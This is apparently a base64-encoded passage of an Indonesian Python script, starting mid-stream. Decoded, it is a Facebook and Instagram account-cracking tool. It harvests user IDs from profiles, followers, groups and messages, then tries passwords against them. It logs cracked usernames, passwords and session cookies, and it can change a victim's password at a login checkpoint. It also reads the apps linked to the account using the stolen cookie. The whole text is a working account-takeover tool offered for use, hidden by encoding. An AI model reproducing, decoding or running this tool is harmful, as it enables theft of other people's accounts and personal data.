ZXNzaW9uLnBvc3QodXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXRhMikNCgkJcmVzcG9uc2UyPXBhcnNlcihhbi50ZXh0LCJodG1sLnBhcnNlciIpDQoJCWNlaz1bY2VrIGZvciBjZWsgaW4gcmVzcG9uc2UyLmZpbmRfYWxsKCJvcHRpb24iKV0NCgkJbnVtYmVyPTANCgkJcHJpbnQoIlxyJXMlcyVzIHRlcmRhcGF0ICVzJXMlcyBvcHNpICVzOiIlKFUsdGlsLE8sUCxzdHIobGVuKGNlaykpLE8sTSkpO2plZGEoMC4wNykNCgkJaWYobGVuKGNlayk9PTApOg0KCQkJaWYgIkxpaGF0IGRldGFpbCBsb2dpbiB5YW5nIGRpdGFtcGlsa2FuLiBJbmkgQW5kYT8iIGluIHRpdGxlOg0KCQkJCWNva2kgPSAoIjsiKS5qb2luKFsgIiVzPSVzIiAlIChrZXksIHZhbHVlKSBmb3Iga2V5LCB2YWx1ZSBpbiBzZXNzaW9uLmNvb2tpZXMuZ2V0X2RpY3QoKS5pdGVtcygpIF0pDQoJCQkJaWYgInkiIGluIHViYWhfcGFzczoNCgkJCQkJdWJhaF9wdyh1c2VyLHB3LHNlc3Npb24scmVzcG9uc2UsbGluazIpDQoJCQkJZWxzZToNCgkJCQkJcHJpbnQoIlxyJXMlcyBha3VuIG9uZSB0YWIsIHNpbGFoa2FuIGFuZGEgbG9naW4JCSIlKEgsdGlsKSkNCgkJCQkJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3LGNva2kpKQ0KCQkJCQlhcGxpa2FzaShjb2tpKQ0KCQkJZWxpZiAiTWFzdWtrYW4gS29kZSBNYXN1ayB1bnR1ayBNZWxhbmp1dGthbiIgaW4gcmUuZmluZGFsbCgiXDx0aXRsZT4oLio/KTxcL3RpdGxlPiIsc3RyKHJlc3BvbnNlKSk6DQoJCQkJcHJpbnQoIlxyJXPigKIgYWt1biB0ZXJwYXNhbmcgYXV0ZW50aWthc2kgZHVhIGZha3RvcgkJCSIlKE0pKQ0KCQkJZWxzZToNCgkJCQlwcmludCgiJXMlcyB0ZXJqYWRpIGtlc2FsYWhhbiIlKE0sdGlsKSkNCgkJZWxpZihsZW4oY2VrKTw9MSk6DQoJCQlmb3IgeCBpbiByYW5nZShsZW4oY2VrKSk6DQoJCQkJbnVtYmVyKz0xDQoJCQkJb3BzaT1yZS5maW5kYWxsKCdcPG9wdGlvbiBzZWxlY3RlZD1cIi4qP1wiIHZhbHVlPVwiLio/XCI+KC4qPyk8XC9vcHRpb24+JyxzdHIoY2VrKSkNCgkJCQlqYWxhbiAoIiAgJXMlcy4gJXMlcyIlKFAsc3RyKG51bWJlciksSyxvcHNpWzBdKSkNCgkJZWxpZihsZW4oY2VrKT49Mik6DQoJCQlmb3IgeCBpbiByYW5nZShsZW4oY2VrKSk6DQoJCQkJbnVtYmVyKz0xDQoJCQkJb3BzaT1yZS5maW5kYWxsKCdcPG9wdGlvbiB2YWx1ZT1cIi4rXCI+KC4rKTxcL29wdGlvbj4nLHN0cihjZWtbeF0pKQ0KCQkJCWphbGFuICgiICAlcyVzLiAlcyVzIiUoUCxzdHIobnVtYmVyKSxLLG9wc2lbMF0pKQ0KCQllbHNlOg0KCQkJaWYgImNfdXNlciIgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQoJCQkJcHJpbnQoIlxyJXPigKIgYWt1biB0aWRhayBjaGVja3BvaW50LCBzaWxhaGthbiBhbmRhIGxvZ2luICIlKEgpKQ0KCQkJCW9wZW4oJ09LLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3KSkNCgllbGlmICJsb2dpbl9lcnJvciIgaW4gc3RyKHJlc3BvbnNlKToNCgkJb2ggPSBydW4uZmluZCgiZGl2Iix7ImlkIjoibG9naW5fZXJyb3IifSkuZmluZCgiZGl2IikudGV4dA0KCQlwcmludCgiJXPigKIgJXMiJShNLG9oKSkNCgllbHNlOg0KCQlsb29wKz0xDQoJCXByaW50KCIlcyVzIGxvZ2luIGdhZ2FsLCBzaWxhaGthbiBjZWsga2VtYmFsaSBpZCBkYW4ga2F0YSBzYW5kaSIlKE0sdGlsKSkNCmRlZiB1YmFoX3B3KHVzZXIscHcsc2Vzc2lvbixyZXNwb25zZSxsaW5rMik6DQoJZGF0LGRhdDI9e30se30NCglidXQ9WyJzdWJtaXRbWWVzXSIsIm5oIiwiZmJfZHRzZyIsImphem9lc3QiLCJjaGVja3BvaW50X2RhdGEiXQ0KCWZvciB4IGluIHJlc3BvbnNlKCJpbnB1dCIpOg0KCQlpZiB4LmdldCgibmFtZSIpIGluIGJ1dDoNCgkJCWRhdC51cGRhdGUoe3guZ2V0KCJuYW1lIik6eC5nZXQoInZhbHVlIil9KQ0KCXViYWhQdz1zZXNzaW9uLnBvc3QodXJsK2xpbmsyLmdldCgiYWN0aW9uIiksZGF0YT1kYXQpLnRleHQNCglyZXNVYmFoPXBhcnNlcih1YmFoUHcsImh0bWwucGFyc2VyIikNCglsaW5rMz1yZXNVYmFoLmZpbmQoImZvcm0iLHsibWV0aG9kIjoicG9zdCJ9KQ0KCWJ1dDI9WyJzdWJtaXRbTmV4dF0iLCJuaCIsImZiX2R0c2ciLCJqYXpvZXN0Il0NCglpZiAiQnVhdCBLYXRhIFNhbmRpIEJhcnUiIGluIHJlLmZpbmRhbGwoIlw8dGl0bGU+KC4qPyk8XC90aXRsZT4iLHN0cih1YmFoUHcpKToNCgkJZm9yIGIgaW4gcmVzVWJhaCgiaW5wdXQiKToNCgkJCWlmIGIuZ2V0KCJuYW1lIikgaW4gYnV0MjoNCgkJCQlkYXQyLnVwZGF0ZSh7Yi5nZXQoIm5hbWUiKTpiLmdldCgidmFsdWUiKX0pDQoJCWRhdDIudXBkYXRlKHsicGFzc3dvcmRfbmV3IjoiIi5qb2luKHB3YmFydSl9KQ0KCQlhbj1zZXNzaW9uLnBvc3QodXJsK2xpbmszLmdldCgiYWN0aW9uIiksZGF0YT1kYXQyKQ0KCQljb2tpID0gKCI7Iikuam9pbihbICIlcz0lcyIgJSAoa2V5LCB2YWx1ZSkgZm9yIGtleSwgdmFsdWUgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKSBdKQ0KCQlwcmludCgiXHIlcyVzIGFrdW4gb25lIHRhYiwgc2FuZGkgYmVyaGFzaWwgZGkgdWJhaCBcbiAqLS0+ICVzIOKXiiAlcyDil4ogJXMJCQkiJShILHRpbCx1c2VyLHB3YmFydVswXSxjb2tpKSkNCgkJb3BlbignT0svJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlc1xuIiAlICh1c2VyLHB3YmFydVswXSxjb2tpKSkNCgkJYXBsaWthc2koY29raSkNCmRlZiBhcGxpa2FzaShrdWtpKToNCglzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCglydW4gPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9zZXR0aW5ncy9hcHBzL3RhYmJlZC8/dGFiPWFjdGl2ZSIpDQoJcnVuXyA9ICgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL3NldHRpbmdzL2FwcHMvdGFiYmVkLz90YWI9aW5hY3RpdmUiKQ0KCW90dyA9IHNlcy5nZXQocnVuLGNvb2tpZXM9eydjb29raWUnOmt1a2l9KQ0KCW90d18gPSBzZXMuZ2V0KHJ1bl8sY29va2llcz17J2Nvb2tpZSc6a3VraX0pDQoJZ2VtID0gcGFyc2VyKG90dy5jb250ZW50LCdodG1sLnBhcnNlcicpDQoJZ2VtXyA9IHBhcnNlcihvdHdfLmNvbnRlbnQsJ2h0bWwucGFyc2VyJykNCglhcGsgPSBnZW0uZmluZCgnZm9ybScsbWV0aG9kPSdwb3N0JykNCglhcGtfID0gZ2VtXy5maW5kKCdmb3JtJyxtZXRob2Q9J3Bvc3QnKQ0KCW5vID0gMA0KCW5vXyA9IDANCgl0cnk6DQoJCWZvciBhcHAgaW4gYXBrLmZpbmRfYWxsKCJoMyIpOg0KCQkJZGF0YSA9IGFwcC5maW5kKCdzcGFuJykudGV4dA0KCQkJbm8rPTENCgkJCWphbGFuKCIgICVzJXMuICVzJXMgIiUoUCxzdHIobm8pLEgsZGF0YSkpDQoJCWZvciBhcHBfIGluIGFwa18uZmluZF9hbGwoImgzIik6DQoJCQlkYXRhXyA9IGFwcF8uZmluZCgnc3BhbicpLnRleHQNCgkJCW5vXys9MQ0KCQkJamFsYW4oIiAgJXMlcy4gJXMlcyAiJShQLHN0cihub18pLE0sZGF0YV8pKQ0KCWV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoNCgkJcHJpbnQgKCIlc+KAoiBnYWdhbCBtZW5kZXRla3NpIiUoTSkpDQoNCiMgTUVOVSBJTkkgQUpHDQpkZWYgbWVudSgpOg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCWZvbGRlcigpDQoJdHJ5Og0KCQlsaXMgPSBvcGVuICgiZGF0YS9saXNlbnNpLnR4dCIsInIiKS5yZWFkKCkNCglleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOg0KCQlvcy5zeXN0ZW0oImNsZWFyIik7cHJpbnQgKCIlc+KAoiBMaXNlbnNpIGthZGFsdWFyc2EiJShNKSk7amVkYSgyKQ0KCQlvcy5zeXN0ZW0oInJtIC1yZiBkYXRhL2xpc2Vuc2kudHh0IikNCgkJa2V5KCkua29uZmlybWFzaSgpDQoJaWYgb3MucGF0aC5leGlzdHMoJ2RhdGEvbGlzZW5zaS50eHQnKToNCgkJdHJ5Og0KCQkJbGlzID0gb3BlbignZGF0YS9saXNlbnNpLnR4dCcsICdyJykucmVhZCgpDQoJCQlnaXQgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ2l0aHViLmNvbS93YXJiYTI5L2xpc2Vuc2kvYmxvYi9tYWluL2lkLnR4dCcpLnRleHQuc3RyaXAoKQ0KCQkJaWYgbGlzIGluIGdpdDoNCgkJCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJCQliYW5uZXIoKQ0KCQkJCXByaW50KCJcbiIpDQoJCQkJcyA9IFsnLiAgICcsICcuLiAgJywgJy4uLiAnXQ0KCQkJCWZvciBtIGluIHM6DQoJCQkJCXByaW50ICdcclx4MWJbMTs5NW3igKJceDFiWzE7OTZtIE1lbWVyaWtzYSBsaXNlbnNpICcgKyBtLA0KCQkJCQlzeXMuc3Rkb3V0LmZsdXNoKCk7amVkYSgxKQ0KCQkJCWphbGFuKCdcbiVz4oCiIExpc2Vuc2kgdGVyc2VkaWEg4oiaJyUoSCkpO2plZGEoMSk7b3Muc3lzdGVtKCdjbGVhcicpDQoJCQllbHNlOg0KCQkJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQkJCWJhbm5lcigpDQoJCQkJcHJpbnQoIlxuIikNCgkJCQlzID0gWycuICAgJywgJy4uICAnLCAnLi4uICddDQoJCQkJZm9yIG0gaW4gczoNCgkJCQkJcHJpbnQgJ1xyXHgxYlsxOzk1beKAolx4MWJbMTs5Nm0gTWVtZXJpa3NhIGxpc2Vuc2kgJyArIG0sDQoJCQkJCXN5cy5zdGRvdXQuZmx1c2goKTtqZWRhKDEpDQoJCQkJamFsYW4oJ1xuJXPigKIgTGlzZW5zaSB0aWRhayB0ZXJzZWRpYSclKE0pKTtqZWRhKDEpDQoJCQkJa2V5KCkua29uZmlybWFzaSgpDQoJCWV4Y2VwdCBJT0Vycm9yOg0KCQkJb3Muc3lzdGVtKCJybSAtcmYgZGF0YS9saXNlbnNpLnR4dCIpDQoJCQlrZXkoKS5rb25maXJtYXNpKCkNCgllbHNlOg0KCQlrZXkoKS5rb25maXJtYXNpKCkNCgl0cnk6DQoJCXJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcsICdyJykucmVhZCgpDQoJZXhjZXB0IElPRXJyb3I6DQoJCXByaW50ICgiJXMlcyBPcHMgYW5kYSBiZWx1bSBsb2dpbiAiJShNLHRpbCkpO2plZGEoMik7b3Muc3lzdGVtKCdybSAtcmYgZGF0YS90b2tlbi50eHQgJiYgcm0gLXJmIGRhdGEvY29va2llcycpO21hc3VrKCkNCgl0cnk6DQoJCXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL21lP2FjY2Vzc190b2tlbj0nK3JvbXosaGVhZGVycz1oZWFkZXIpDQoJCWEgPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJbmFtYSA9IGFbIm5hbWUiXQ0KCWV4Y2VwdCBLZXlFcnJvcjoNCgkJcHJpbnQgKCIlcyVzIFRva2VuIGludmFsaWQgIiUoTSx0aWwpKTtqZWRhKDIpO29zLnN5c3RlbSgncm0gLXJmIGRhdGEvdG9rZW4udHh0ICYmIHJtIC1yZiBkYXRhL2Nvb2tpZXMnKTttYXN1aygpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlleGl0KCdcblxuJXMlcyB0aWRhayBhZGEga29uZWtzaSVzXG4nJShNLHRpbCxOKSkNCgliYW5uZXIoKQ0KCXByaW50ICgnJXMgIyAlc05hbWUgJXM6ICVzJXMlcyBcbiclKFUsTyxNLEgsbmFtYSxPKSkNCglwcmludCAoJyVz4oCiJXMgMDEgJXNEdW1wIGlkIHB1YmxpYyclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDIgJXNEdW1wIGlkIGZvbGxvd2VycyclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDMgJXNEdW1wIGlkIHJlYWN0aW9uIHBvc3QnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA0ICVzRHVtcCBpZCBhbmdnb3RhIGdyb3VwJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAwNSAlc0R1bXAgaWQgcGVuY2FyaWFuIG5hbWEnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA2ICVzRHVtcCBpZCBwZXNhbiBtZXNlbmdnZXInJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDA3ICVzRHVtcCBpZCAodW50dWsgbWVuY2FyaSBpZCBvbGQpJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAwOCAlc0NyYWNrIGZhY2Vib29rJyUoVSxQLEgpKQ0KCXByaW50ICgnJXPigKIlcyAwOSAlc0NyYWNrIGluc3RhZ3JhbSclKFUsUCxIKSkNCglwcmludCAoJyVz4oCiJXMgMTAgJXNTZXR0aW5nIHVzZXIgYWdlbnQnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDExICVzQ2VrIGhhc2lsIGNyYWNrJyUoVSxQLE8pKQ0KCXByaW50ICgnJXPigKIlcyAxMiAlc0NlayBvcHNpIGFrdW4nJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIDEzICVzSW5mbyBzY3JpcHQnJShVLFAsTykpDQoJcHJpbnQgKCclc+KAoiVzIHJtICVzSGFwdXMgYWt1biclKFUsUCxPKSkNCglwcmludCAoJyVz4oCiJXMgMDAgJXNLZWx1YXInJShVLE0sTykpDQoJc2x1dCA9IHJhd19pbnB1dCgnXG4lcyMgJXNQaWxpaCAlcz4gJXMnJShQLE8sTSxLKSkNCglqaWVoKHNsdXQscm9teikNCmRlZiBqaWVoKHNsdXQscm9teik6DQogICAgaWYgc2x1dCA9PSAnJzoNCiAgICAgICAgcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgIGVsaWYgc2x1dCBpblsnMScsJzAxJ106DQogICAgCWdhbiA9IHJhd19pbnB1dCAoIlxuJXMlcyVzIGFwYWthaCBhbmRhIGluZ2luIGdhbmRha2FuIGlkPyB5L3QlcyA+JXMgIiUoVSx0aWwsTyxNLEspKQ0KICAgICAgICBpZiBnYW4gaW5bIiJdOg0KICAgICAgICAJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgICAgICBlbGlmIGdhbiBpblsneScsJ1knXToNCiAgICAgICAgCW1hc3NhbChyb216KQ0KICAgICAgICBlbGlmIGdhbiBpblsndCcsJ1QnXToNCiAgICAgICAgCXB1Ymxpayhyb216KQ0KICAgICAgICBlbHNlOg0KICAgICAgICAJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KICAgIGVsaWYgc2x1dCBpblsnMicsJzAyJ106DQogICAgICAgIGZvbGxvd2Vycyhyb216KQ0KICAgIGVsaWYgc2x1dCBpblsnMycsJzAzJ106DQogICAgICAgIHBvc3Rpbmdhbihyb216KQ0KICAgIGVsaWYgc2x1dCBpblsnNCcsJzA0J106DQogICAgICAgIGdyb3VwKF9fcm9tel9fKCkpDQogICAgZWxpZiBzbHV0IGluWyc1JywnMDUnXToNCiAgICAJZHVtcGZsKCk7ZXhpdCgpDQogICAgZWxpZiBzbHV0IGluWyc2JywnMDYnXToNCiAgICAJcGVzYW4oX19yb216X18oKSkNCiAgICBlbGlmIHNsdXQgaW5bJzcnLCcwNyddOg0KICAgIAlkdW1wX2lkKCkucGlsaWhhbigpDQogICAgZWxpZiBzbHV0IGluWyc4JywnMDgnXToNCiAgICAgICAgbmdlbnRvZCgpLnJvbWl5KCkNCiAgICBlbGlmIHNsdXQgaW5bJzknLCcwOSddOg0KICAgIAlpZ2coKQ0KICAgIGVsaWYgc2x1dCBpblsnMTAnXToNCiAgICAJdXNlcmFnZW50KCkNCiAgICBlbGlmIHNsdXQgaW5bJzExJ106DQogICAgCXByaW50ICgiXG4lcyVzJXMgMDEgJXNDZWsgaGFzaWwgYWt1biBmYWNlYm9vayAiJShVLHRpbCxQLE8pKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyAwMiAlc0NlayBoYXNpbCBha3VuIGluc3RhZ3JhbSAiJShVLHRpbCxQLE8pKQ0KICAgICAgICBwcmludCAoIiVzJXMlcyAwMyAlc0hhcHVzIGhhc2lsIGNyYWNrICIlKFUsdGlsLFAsTykpDQogICAgICAgIHByaW50ICgiJXMlcyVzIDAwICVzS2VtYmFsaSAiJShVLHRpbCxNLE8pKQ0KICAgICAgICByb20gPSByYXdfaW5wdXQoJ1xuJXMjICVzUGlsaWggJXM+ICVzJyUoUCxPLE0sSykpDQogICAgICAgIGNla19jZWsocm9tKQ0KICAgIGVsaWYgc2x1dCBpblsnMTInXToNCiAgICAJZmlsZV9jcCgpDQogICAgZWxpZiBzbHV0IGluWycxMyddOg0KICAgIAlpbmdmb2goKQ0KICAgIGVsaWYgc2x1dCBpblsncm0nLCdSbScsJ1JNJ106DQogICAgICAgIHByaW50ICgnJykNCiAgICAgICAgdGlrKCk7amVkYSgxKTtvcy5zeXN0ZW0oJ3JtIC1yZiBkYXRhL3Rva2VuLnR4dCAmJiBybSAtcmYgZGF0YS9jb29raWVzJykNCiAgICAgICAgamFsYW4oJ1xuJXMlcyBiZXJoYXNpbCB0ZXJoYXB1cyAnJShILHRpbCkpO2V4aXQoKQ0KICAgIGVsaWYgc2x1dCBpblsnMCcsJzAwJ106DQogICAgCWV4aXQoJ1xuJykNCiAgICBlbHNlOg0KICAgICAgICBwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojSEFQVVMgSEFTSUwNCmRlZiBoYXB1c19oYXNpbCgpOg0KCW9zLnN5c3RlbSgncm0gLXJmIENQLyogJiYgT0svKicpDQoJb3Muc3lzdGVtKCdybSAtcmYgb2tlaC50eHQgJiYgY2VwZWgudHh0JykNCglwcmludCAoJycpO2plZGEoMikNCglqYWxhbiAoSCsnIOKImiBiZXJoYXNpbCBtZW5naGFwdXMgaGFzaWwgY3JhY2sgJyk7amVkYSgyKQ0KCW1lbnUoKQ0KIyBDRUsgSEFTSUwNCmRlZiBoYXNpbGwoKToNCglwcmludCAoIlxuJXMlcyVzIDAxICVzQ2VrIGhhc2lsIGFrdW4gJXNPSyAiJShVLHRpbCxQLE8sSCkpDQoJcHJpbnQgKCIlcyVzJXMgMDIgJXNDZWsgaGFzaWwgYWt1biAlc0NQICIlKFUsdGlsLFAsTyxLKSkNCglwcmludCAoIiVzJXMlcyAwMCAlc0tlbWJhbGkgIiUoVSx0aWwsTSxPKSkNCmRlZiBjZWtfY2VrKHJvbSk6DQoJaWYgcm9tIGluWycnXToNCgkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KCWVsaWYgcm9tIGluWycxJywnMDEnXToNCgkJaGFzaWxfZmIoKQ0KCWVsaWYgcm9tIGluWycyJywnMDInXToNCgkJaGFzaWxfaWdlaCgpDQoJZWxpZiByb20gaW5bJzAzJywnMyddOg0KCQloYXB1c19oYXNpbCgpDQoJZWxpZiByb20gaW5bJzAnLCcwMCddOg0KCQltZW51KCkNCgllbHNlOg0KCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojIENFSyBIQVNJTCBGQUNFQk9PSw0KZGVmIGhhc2lsX2ZiKCk6DQoJaGFzaWxsKCkNCglsID0gcmF3X2lucHV0KCdcbiVzIyVzIFBpbGloICVzPiAlcyAnJShQLE8sTSxLKSkNCglpZiBsIGluWycnXToNCgkJcHJpbnQgJ1xuJXMlcyBpc2kgeWFuZyBiZW5hciclKE0sdGlsKTtqZWRhKDIpO21lbnUoKQ0KCWVsaWYgbCBpblsnMScsJzAxJ106DQoJCWRpcnMgPSBvcy5saXN0ZGlyKCdPSycpDQoJCXByaW50ICgiXG4lc+KAoiVzIFslcyBoYXNpbCBjcmFjayB5YW5nIHRlcnNpbXBhbiAlc11cbiIlKFUsTyxVLE8pKQ0KCQlmb3IgZmlsZSBpbiBkaXJzOg0KCQkJcHJpbnQoIiVz4oCiJXM+ICVzJXMiJShVLE0sSCxmaWxlKSk7amVkYSgwLjA3KQ0KCQl0cnk6DQoJCQlmaWxlID0gcmF3X2lucHV0KCJcbiVz4oCiJXMgbWFzdWthbiBmaWxlICVzOiVzICIlKFUsTyxNLEgpKTtqZWRhKDAuMikNCgkJCWlmIGZpbGUgaW5bJyddOg0KCQkJCWV4aXQoIiVz4oCiIGlzaSB5YW5nIGJlbmFyIGtlbnRvZCIlKE0pKQ0KCQkJdG90YWxvayA9IG9wZW4oJ09LLyVzJyAlIGZpbGUpLnJlYWQoKS5zcGxpdGxpbmVzKCkNCgkJZXhjZXB0IChLZXlFcnJvciwgSU9FcnJvcik6DQoJCQlwcmludCgiJXMlcyBmaWxlIHRpZGFrIGFkYSAiJShNLHRpbCkpDQoJCW5tX2ZpbGUgPSAoJyVzJyAlIGZpbGUpLnJlcGxhY2UoJy0nLCAnICcpDQoJCWZpbGVfbm0gPSBubV9maWxlLnJlcGxhY2UoJy50eHQnLCAnJykNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCQlqYWxhbigiJXPigKIlcyBoYXNpbCB0YW5nZ2FsJXMgOiAlcyVzICVzdG90YWwgJXM6ICVzJXMiJShVLE8sTSxILGZpbGVfbm0sTyxNLEgsbGVuKHRvdGFsb2spKSkNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSCkpO2plZGEoMikNCgkJb3Muc3lzdGVtKCdjYXQgT0svJXMnICUgZmlsZSkNCgkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyIlKFAsTSxQKSk7amVkYSgyKQ0KCQlleGl0KCdcbicpDQoJZWxpZiBsIGluWycyJywnMDInXToNCgkJZGlycyA9IG9zLmxpc3RkaXIoJ0NQJykNCgkJcHJpbnQgKCJcbiVz4oCiJXMgWyVzIGhhc2lsIGNyYWNrIHlhbmcgdGVyc2ltcGFuICVzXVxuIiUoVSxPLFUsTykpDQoJCWZvciBmaWxlIGluIGRpcnM6DQoJCQlwcmludCgiJXPigKIlcz4gJXMlcyIlKFUsTSxLLGZpbGUpKTtqZWRhKDAuMDcpDQoJCXRyeToNCgkJCWZpbGUgPSByYXdfaW5wdXQoIlxuJXPigKIlcyBtYXN1a2FuIGZpbGUgJXM6JXMgIiUoVSxPLE0sSykpO2plZGEoMC4yKQ0KCQkJaWYgZmlsZSBpblsnJ106DQoJCQkJZXhpdCgiJXPigKIgaXNpIHlhbmcgYmVuYXIga2VudG9kIiUoTSkpDQoJCQl0b3RhbGNwID0gb3BlbignQ1AvJXMnICUgZmlsZSkucmVhZCgpLnNwbGl0bGluZXMoKQ0KCQlleGNlcHQgKEtleUVycm9yLCBJT0Vycm9yKToNCgkJCXByaW50KCIlcyVzIGZpbGUgdGlkYWsgYWRhICIlKE0sdGlsKSkNCgkJbm1fZmlsZSA9ICgnJXMnICUgZmlsZSkucmVwbGFjZSgnLScsICcgJykNCgkJZmlsZV9ubSA9IG5tX2ZpbGUucmVwbGFjZSgnLnR4dCcsICcnKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjIiUoUCxNLFApKTtqZWRhKDIpDQoJCWphbGFuKCIlc+KAoiVzIGhhc2lsIHRhbmdnYWwlcyA6ICVzJXMgJXN0b3RhbCVzIDogJXMlcyIlKFUsTyxNLEssZmlsZV9ubSxPLE0sSyxsZW4odG90YWxjcCkpKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQlvcy5zeXN0ZW0oJ2NhdCBDUC8lcycgJSBmaWxlKQ0KCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjIiUoUCxNLFApKTtqZWRhKDIpDQoJCWV4aXQoJ1xuJykNCgllbGlmIGwgaW5bJzAnLCcwMCddOg0KCQltZW51KCkNCgllbHNlOg0KCQlwcmludCAnXG4lcyVzIGlzaSB5YW5nIGJlbmFyJyUoTSx0aWwpO2plZGEoMik7bWVudSgpDQojIENFSyBIQVNJTCBJR0VIDQpkZWYgaGFzaWxfaWdlaCgpOg0KCWhhc2lsbCgpDQoJd2hpbGUgVHJ1ZToNCgkJcm9tID0gcmF3X2lucHV0KCdcbiVzIyAlc1BpbGloICVzPiAlcyclKFAsTyxNLEspKQ0KCQlpZiByb20gaW5bJzEnLCcwMSddOg0KCQkJdHJ5Og0KCQkJCW9rZSA9IG9wZW4oIm9rZWgudHh0IiwgInIiKS5yZWFkbGluZXMoKQ0KCQkJCXByaW50ICgiXG4lc+KAoiVzIFslcyBoYXNpbCBjcmFjayB5YW5nIHRlcnNpbXBhbiAlc11cbiIlKFUsTyxVLE8pKQ0KCQkJCXByaW50KCIgJXMjICVzLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSAlcyMlcyIlKFAsTSxQLEspKTtqZWRhKDIpDQoJCQkJcHJpbnQgKCIlc+KAoiAlc0p1bWxhaCAlczogJXMlcyIlKFUsTyxNLEgsc3RyKGxlbihva2UpKSkpDQoJCQkJcHJpbnQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSCkpO2plZGEoMikNCgkJCQlva2VrID0gb3Blbigib2tlaC50eHQiLCAiciIpLnJlYWQoKQ0KCQkJCXByaW50IChva2VrKQ0KCQkJCWV4aXQoIiAlcyMgJXMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tICVzIyVzIiUoUCxNLFAsSykpO2plZGEoMikNCgkJCWV4Y2VwdCBJT0Vycm9yLEtleUVycm9yOg0KCQkJCWV4aXQgKE0rIlxu4oCiIHRpZGFrIGFkYSBoYXNpbCBhd29rYXdva2F3b2siKQ0KCQllbGlmIHJvbSBpblsnMicsJzAyJ106DQoJCQl0cnk6DQoJCQkJY2VwZSA9IG9wZW4oImNlcGVoLnR4dCIsICJyIikucmVhZGxpbmVzKCkNCgkJCQlwcmludCAoIlxuJXPigKIlcyBbJXMgaGFzaWwgY3JhY2sgeWFuZyB0ZXJzaW1wYW4gJXNdXG4iJShVLE8sVSxPKSkNCgkJCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gJXMjJXMiJShQLE0sUCxLKSk7amVkYSgyKQ0KCQkJCXByaW50ICgiJXPigKIgJXNKdW1sYWggJXM6ICVzJXMiJShVLE8sTSxLLHN0cihsZW4oY2VwZSkpKSkNCgkJCQlwcmludCgiICVzIyAlcy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t